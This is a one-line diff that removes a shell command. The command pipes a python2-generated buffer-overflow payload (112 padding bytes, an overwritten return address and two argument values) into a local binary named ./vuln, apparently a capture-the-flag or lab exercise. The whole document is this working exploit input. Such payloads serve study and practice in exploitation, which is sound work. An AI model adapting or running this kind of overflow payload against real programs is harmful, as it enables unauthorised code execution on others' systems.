@@ -1,1 +1,0 @@
-python2 -c 'print "A" * 112 + "\xcb\x85\x04\x08" + "AAAA" + "\xef\xbe\xad\xde" + "\xde\xc0\xad\xde" ' | ./vuln
